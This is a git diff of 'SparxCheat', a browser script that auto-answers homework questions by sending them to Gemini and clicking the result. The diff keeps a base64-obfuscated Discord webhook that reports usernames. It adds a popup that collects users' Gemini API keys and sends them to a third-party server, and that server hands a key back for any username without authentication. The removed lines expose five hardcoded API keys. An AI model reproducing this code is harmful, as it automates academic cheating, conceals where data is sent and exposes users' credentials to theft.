@@ -3,20 +3,231 @@ const targetText = "SparxCheat";
 const webhookBase = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyMjk2MzcxMTQ0MTg5OTU4MS9qaF9sa0F5MW5ka3VSUTJmZmJjNXFDU3E5R3VjdkR2dTRIV2xVU3dCMUdaTWJSRFA4dEZtRzJQbTBQMnNTMmswZGw3cA==";
 const webhookURL = atob(webhookBase);
 let username = null;
+let userApiKey = null;
 
 // === Find Username (wait for login) ===
 function findUsername() {
-  const usernameInterval = setInterval(() => {
-    const nameDivs = document.querySelectorAll('div');
-    if (nameDivs.length > 9 && nameDivs[8].textContent.trim() !== "" && nameDivs[8].textContent.trim() !== "Log in") {
-      username = nameDivs[8].textContent.trim();
-      console.log("Username found:", username);
-      clearInterval(usernameInterval);
-      startScanning();
-    } else {
-      console.log("Username not yet found. Retrying...");
+  return new Promise((resolve) => {
+    const usernameInterval = setInterval(() => {
+      const nameDivs = document.querySelectorAll('div');
+      if (
+        nameDivs.length > 9 &&
+        nameDivs[8].textContent.trim() !== "" &&
+        nameDivs[8].textContent.trim() !== "Log in"
+      ) {
+        username = nameDivs[8].textContent.trim();
+        console.log("Username found:", username);
+        clearInterval(usernameInterval);
+        resolve(username); // ✅ resolve the Promise with the username
+      } else {
+        console.log("Username not yet found. Retrying...");
+      }
+    }, 2000);
+  });
+}
+
+async function checkUserApiKey(username) {
+  const checkUrl = "https://livemsg.onrender.com/api/checkKey?username=" + encodeURIComponent(username);
+  try {
+    const res = await fetch(checkUrl);
+    if (!res.ok) throw new Error("Failed to check API key");
+    const data = await res.json();
+    
+    if(data.hasKey) {
+      userApiKey = data.apiKey; // ✅ automatically store the user's key
     }
-  }, 2000);
+    
+    return data.hasKey; // still returns true/false
+  } catch (e) {
+    console.error("Error checking API key:", e);
+    return false;
+  }
+}
+
+// After username is found:
+findUsername().then(async () => {
+  const hasKey = await checkUserApiKey(username);
+  if (!hasKey) {
+    showApiKeyPopup(); // only show popup if no key saved
+  } else {
+    console.log("✅ Using saved API key from server:", userApiKey);
+    startScanning(); // continue normal script
+  }
+});
+
+async function sendApiKeyToServer(username, key) {
+  try {
+    const response = await fetch("https://livemsg.onrender.com/api/saveKey", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username, key })
+    });
+
+    if (!response.ok) {
+      throw new Error(`Server rejected request: ${response.statusText}`);
+    }
+
+    const data = await response.json();
+    console.log("✅ API key successfully saved on server:", data);
+  } catch (err) {
+    console.error("❌ Failed to save API key to server:", err);
+  }
+}
+
+function showApiKeyPopup() {
+  if (document.getElementById('sparx-key-popup')) return;
+
+  // --- Load Font Awesome ---
+  if (!document.querySelector('link[href*="font-awesome"]')) {
+    const fa = document.createElement('link');
+    fa.rel = 'stylesheet';
+    fa.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css';
+    fa.crossOrigin = 'anonymous';
+    document.head.appendChild(fa);
+  }
+
+  // --- Modal wrapper ---
+  const wrapper = document.createElement('div');
+  wrapper.id = 'sparx-key-popup';
+  wrapper.style.position = 'fixed';
+  wrapper.style.top = '0';
+  wrapper.style.left = '0';
+  wrapper.style.width = '100vw';
+  wrapper.style.height = '100vh';
+  wrapper.style.display = 'flex';
+  wrapper.style.alignItems = 'center';
+  wrapper.style.justifyContent = 'center';
+  wrapper.style.background = 'radial-gradient(circle at center, rgba(0,0,0,1) 0%, rgba(0,0,0,0.7) 70%, rgba(0,0,0,0.5) 100%)';
+  wrapper.style.zIndex = '999999';
+
+  // --- Modal content ---
+  const modal = document.createElement('div');
+  modal.style.background = 'rgba(28,28,28,0.98)';
+  modal.style.borderRadius = '14px';
+  modal.style.padding = '30px';
+  modal.style.width = '440px';
+  modal.style.maxWidth = '90%';
+  modal.style.color = '#fff';
+  modal.style.fontFamily = "'Rubik', sans-serif";
+  modal.style.position = 'relative';
+  modal.style.boxShadow = '0 0 30px rgba(0,0,0,0.85)';
+
+  modal.innerHTML = `
+    <!-- Header with logo and title -->
+    <div style="display:flex; align-items:center; gap:15px; margin-bottom:20px;">
+      <img src="https://kikinaqvi.github.io/Sparx/icon.png" style="width:60px; height:60px; border-radius:10px;">
+      <h2 style="margin:0; font-size:1.6em; color:#fff;">SparxCheat AI Key</h2>
+    </div>
+
+    <!-- Instructions -->
+    <div style="
+      background: rgba(255,255,255,0.05);
+      border-radius: 10px; padding: 15px;
+      margin-bottom: 20px; font-size: 14px; text-align: left;
+      line-height: 1.6;
+    ">
+      1. Go to <strong>aistudio.google.com</strong><br>
+      2. Sign in<br>
+      3. Click <strong>Get API Key</strong><br>
+      4. Click <strong>Create API Key</strong><br>
+      5. Select a default project, name the key <strong>SparxCheat</strong>, and click <strong>Create API Key</strong><br>
+      6. Copy the key and paste it below
+    </div>
+
+    <!-- API Key Input -->
+    <input id="sparxApiKeyInput" type="text" placeholder="Paste API key here" style="
+      width: 100%; padding: 12px 14px; border-radius: 10px;
+      border: none; margin-bottom: 20px; background: rgba(255,255,255,0.05);
+      color: #fff; font-size: 15px; outline:none;
+    ">
+
+    <!-- Buttons -->
+    <div style="display: flex; flex-direction: column; gap: 12px;">
+      <button id="sendApiKeyBtn" class="cheat-btn">
+        <i class="fa fa-paper-plane"></i> Send Key
+      </button>
+      <button id="tutorialBtn" class="cheat-btn">
+        <i class="fa fa-video"></i> Tutorial
+      </button>
+    </div>
+  `;
+
+  wrapper.appendChild(modal);
+  document.body.appendChild(wrapper);
+
+  // --- Button actions ---
+  document.getElementById('sendApiKeyBtn').addEventListener('click', async () => {
+    const key = document.getElementById('sparxApiKeyInput').value.trim();
+    if (!key) return alert("Please enter your API key!");
+    
+    userApiKey = key;  // ✅ store the user's key
+    wrapper.remove();
+    await sendApiKeyToServer(username, key);
+    startScanning();
+  });
+
+
+  document.getElementById('tutorialBtn').addEventListener('click', () => {
+    showTutorialPopup();
+  });
+}
+
+// --- Tutorial popup ---
+function showTutorialPopup() {
+  if (document.getElementById('sparx-tutorial-popup')) return;
+
+  const wrapper = document.createElement('div');
+  wrapper.id = 'sparx-tutorial-popup';
+  wrapper.style.position = 'fixed';
+  wrapper.style.top = '0';
+  wrapper.style.left = '0';
+  wrapper.style.width = '100vw';
+  wrapper.style.height = '100vh';
+  wrapper.style.display = 'flex';
+  wrapper.style.alignItems = 'center';
+  wrapper.style.justifyContent = 'center';
+  wrapper.style.background = 'radial-gradient(circle, #111 0%, #000 100%)';
+  wrapper.style.zIndex = '999999';
+
+  const modal = document.createElement('div');
+  modal.style.background = '#1c1c1c';
+  modal.style.borderRadius = '12px';
+  modal.style.padding = '20px';
+  modal.style.width = '600px';
+  modal.style.color = '#fff';
+  modal.style.textAlign = 'center';
+  modal.style.boxShadow = '0 0 16px rgba(0,0,0,0.8)';
+
+  modal.innerHTML = `
+    <div style="text-align: right;">
+      <span id="closeTutorialBtn" style="cursor:pointer; color:#aaa; font-size:18px;">×</span>
+    </div>
+    <video src="https://www.itskiyan.xyz/media/tutorial.mp4" controls style="width:100%; border: 3px solid #000; border-radius:8px;"></video>
+  `;
+
+  wrapper.appendChild(modal);
+  document.body.appendChild(wrapper);
+
+  document.getElementById('closeTutorialBtn').addEventListener('click', () => wrapper.remove());
+}
+
+function showTutorialVideo() {
+  const vidWrapper = document.createElement('div');
+  vidWrapper.style = `
+    position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+    background: #111; padding: 10px; border-radius: 12px; z-index: 1000000;
+    display: flex; flex-direction: column; align-items: center;
+    box-shadow: 0 0 20px rgba(0,0,0,0.9);
+  `;
+
+  vidWrapper.innerHTML = `
+    <span id="vidClose" style="align-self:flex-end; cursor:pointer; font-weight:bold; color:gray; font-size:18px;">✖</span>
+    <video src="https://www.itskiyan.xyz/media/tutorial.mp4" controls style="border: 2px solid black; border-radius: 8px; width: 100%;"></video>
+  `;
+
+  document.body.appendChild(vidWrapper);
+
+  document.getElementById('vidClose').addEventListener('click', () => vidWrapper.remove());
 }
 
 // === Scan for SparxCheat usage and report to Discord ===
@@ -60,21 +271,6 @@ function scanDivsAndReport() {
 }
 function startScanning() { scanDivsAndReport(); }
 findUsername();
-
-// === API Key Rotation for Gemini ===
-const API_KEYS = [
-  "AIzaSyC8cV77lOwUFfq0XvxZiihQYrevR-4Bx2Q",
-  "AIzaSyD3DqH5jOQGHons7R7FFvoGeOklY370oD0",
-  "AIzaSyDvqHFCSC22teq-Zetq5rH6On8hRokzg7Q",
-  "AIzaSyDizJwLajsUHRLsyzOv6AU3s3Z4FPU2lwk",
-  "AIzaSyAmVyqMqaQp53VtiUg1slBdwdoKSWfQtow"
-];
-let currentKeyIndex = 0;
-function getCurrentApiKey() { return API_KEYS[currentKeyIndex]; }
-function switchToNextKey() {
-  currentKeyIndex = (currentKeyIndex + 1) % API_KEYS.length;
-  console.warn("🔄 Switched to next API key:", getCurrentApiKey());
-}
 
 // === Button Automation (auto click navigation buttons) ===
 setInterval(() => {
@@ -284,24 +480,25 @@ if (!document.getElementById('sparx-cheat-popup')) {
     }
   });
   document.addEventListener("mouseup", () => { isDragging = false; });
-  
-popupHeader.addEventListener("touchstart", (e) => {
+
+  popupHeader.addEventListener("touchstart", (e) => {
     if (e.target.closest('.window-controls')) return;
     isDragging = true;
     const touch = e.touches[0];
     offsetX = touch.clientX - wrapper.offsetLeft;
     offsetY = touch.clientY - wrapper.offsetTop;
-});
+  });
 
-document.addEventListener("touchmove", (e) => {
+  document.addEventListener("touchmove", (e) => {
     if (!isDragging) return;
     const touch = e.touches[0];
     wrapper.style.left = `${touch.clientX - offsetX}px`;
     wrapper.style.top = `${touch.clientY - offsetY}px`;
     e.preventDefault(); // prevents scrolling while dragging
-});
+  });
 
-document.addEventListener("touchend", () => { isDragging = false; });
+  document.addEventListener("touchend", () => { isDragging = false; });
+
   
   // --- Particle Animation ---
   for (let i = 0; i < 15; i++) {
@@ -454,6 +651,11 @@ const clickButton = (buttonText) => {
 
 // === Gemini API Query ===
 async function queryGemini(question, options, context) {
+  if (!userApiKey) {
+    console.error("❌ No user API key provided!");
+    return null;
+  }
+
   const prompt = `
     You are an automated multiple-choice answering system.
     You will receive:
@@ -462,43 +664,36 @@ async function queryGemini(question, options, context) {
     - A list of possible answer options
     🔒 RULES (strictly enforced):
     - You must respond with ONE and ONLY ONE of the provided options.
-    - The response MUST match one of the options **EXACTLY** (case-insensitive allowed, but no rewording).
+    - The response MUST match one of the options **EXACTLY**.
     - DO NOT explain.
-    - DO NOT provide reasoning.
     - DO NOT output anything other than the correct answer string as it appears in the options.
     Context: ${context}
     Question: ${question}
     Options: ${options.join(', ')}
-    Respond with the exact correct answer from the options above. Nothing else.
     Answer:
   `;
-  for (let i = 0; i < API_KEYS.length; i++) {
-    try {
-      const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash-lite:generateContent?key=${getCurrentApiKey()}`, {
+
+  try {
+    const response = await fetch(
+      `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-lite:generateContent?key=${userApiKey}`,
+      {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] })
-      });
-      if (response.status === 429) {
-        console.warn("🚫 Hit rate limit (429)! Trying next key...");
-        switchToNextKey();
-        continue;
+        body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] }),
       }
-      if (!response.ok) {
-        console.error("💥 Gemini API Error:", response.statusText);
-        return null;
-      }
-      const data = await response.json();
-      const answer = data?.candidates?.[0]?.content?.parts?.[0]?.text?.trim();
-      console.log("🧠 Gemini Response:", data);
-      return answer || "No answer found";
-    } catch (error) {
-      console.error("⚠️ Gemini API Fetch Error:", error);
-      switchToNextKey();
+    );
+    if (!response.ok) {
+      console.error("💥 Gemini API Error:", response.statusText);
+      return null;
     }
+    const data = await response.json();
+    const answer = data?.candidates?.[0]?.content?.parts?.[0]?.text?.trim();
+    console.log("🧠 Gemini Response:", answer);
+    return answer || "No answer found";
+  } catch (error) {
+    console.error("⚠️ Gemini API Fetch Error:", error);
+    return null;
   }
-  console.error("❌ All API keys exhausted or failed.");
-  return null;
 }
 
 // === Auto Answer Logic ===
@@ -566,3 +761,58 @@ async function checkForQs() {
     }
   }, 1000);
 }
+
+// === Keyboard Shortcut Feature ===
+// 1 = Auto, 2 = Stop Auto, 3 = Manual + Begin
+document.addEventListener('keydown', async (e) => {
+  const key = e.key;
+
+  // Helper functions to simulate button actions even if UI is closed
+  const triggerAuto = () => {
+    const autoBtn = document.getElementById('autoBtn');
+    const slider = document.getElementById('speedSlider');
+    if (autoBtn && slider) {
+      autoBtn.click();
+      console.log("🎯 Auto button triggered via keyboard");
+    } else {
+      // UI is closed, start auto manually
+      console.log("🎯 Auto UI closed, starting auto manually");
+      const delaySeconds = 1.5; // default speed
+      if (window.autoSliderInterval) clearInterval(window.autoSliderInterval);
+      window.autoSliderInterval = setInterval(() => {
+        if (!questionAndOptionsExist()) checkForQs();
+      }, delaySeconds * 1000);
+    }
+  };
+
+  const stopAuto = () => {
+    const stopBtn = document.getElementById('stopAutoBtn');
+    if (stopBtn) {
+      stopBtn.click();
+      console.log("🛑 Stop Auto triggered via keyboard");
+    } else if (window.autoSliderInterval) {
+      clearInterval(window.autoSliderInterval);
+      window.autoSliderInterval = null;
+      console.log("🛑 Auto stopped manually (UI closed)");
+      const bottomText = document.getElementById('bottomText');
+      if (bottomText) bottomText.textContent = "Auto loop stopped ❌";
+    }
+  };
+
+  const triggerManualBegin = () => {
+    const manualBtn = document.getElementById('manualBtn');
+    const manualWrapper = document.getElementById('manualWrapper');
+    const beginButton = manualWrapper?.querySelector('button');
+    if (manualBtn) manualBtn.click();
+    if (beginButton) beginButton.click();
+    else {
+      console.log("🖊 Manual UI closed, triggering manual logic directly");
+      checkForQs();
+    }
+  };
+
+  // Map keys
+  if (key === '1') triggerAuto();
+  if (key === '2') stopAuto();
+  if (key === '3') triggerManualBegin();
+});
